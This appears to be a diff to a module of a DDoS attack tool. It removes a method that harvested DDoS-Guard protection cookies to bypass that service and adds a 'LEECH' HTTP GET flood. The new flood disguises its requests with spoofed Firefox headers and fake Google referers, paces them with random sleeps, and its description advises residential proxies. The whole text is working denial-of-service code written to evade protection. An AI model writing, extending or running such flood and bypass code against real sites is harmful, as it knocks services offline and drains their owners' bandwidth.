@@ -26,57 +26,39 @@ import time, requests
 from src.core import Core
 from src.utils import *
 from src.useragent import *
+from random import uniform
 
+keyword = choice(keywords) # pick a random keyword
 def flood(attack_id, url, stoptime) -> None:
-    '''
-    launches a HTTP GET flood
-    '''
-
-    if not Core.ddosguard_cookies_grabbed: # if no cookies have been found yet, we try and grab them first
-        headers = utils().buildheaders(url)
-        session = requests.session() # we can't use the utils().buildsession() function, because that one has a timeout of 0.1 ms
-        idss = None
-
-        try:
-            with session.get(url, headers=headers, verify=False) as req:
-                for key, value in req.cookies.items():
-                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
-        except Exception:
-            pass
-        
-        try:
-            with session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
-                for key, value in req.cookies.items():
-                    if key == '__ddg2':
-                        idss = value
-
-                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
-        except Exception:
-            pass
-        
-        if idss:
-            try:
-                with session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False) as req:
-                    for key, value in req.cookies.items():
-                        Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
-            except Exception:
-                pass
-        
-        Core.ddosguard_cookies_grabbed = True
-        print('[DDOS-GUARD] Got cookies')
 
     while time.time() < stoptime and Core.attackrunning:
         try:
 
             Core.session.get(
-                utils().buildblock(url), 
-                headers=utils().buildheaders(url),
+                url, 
+                headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Referer': f'https://google.com?q={keyword}',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-User': '?1',
+                    'TE': 'trailers'
+                },
                 verify=False, 
-                timeout=(5,0.1), 
-                allow_redirects=False,
+                timeout=(10,10), 
+                allow_redirects=True,
                 stream=False,
                 cert=None
             )
+
+            time.sleep(uniform(80, 160))
 
             Core.infodict[attack_id]['req_sent'] += 1
         except requests.exceptions.ReadTimeout:
@@ -88,10 +70,9 @@ def flood(attack_id, url, stoptime) -> None:
         Core.infodict[attack_id]['req_total'] += 1
     Core.threadcount -= 1
 
-# add the method to the methods dictionary
 Core.methods.update({
-    'DDG': {
-        'info': 'HTTP GET DDoSGuard bypass',
+    'LEECH': {
+        'info': 'Exotic bandwidth draining flood, keep the thread count below <5 and use residential proxies for better results',
         'func': flood
     }
 })
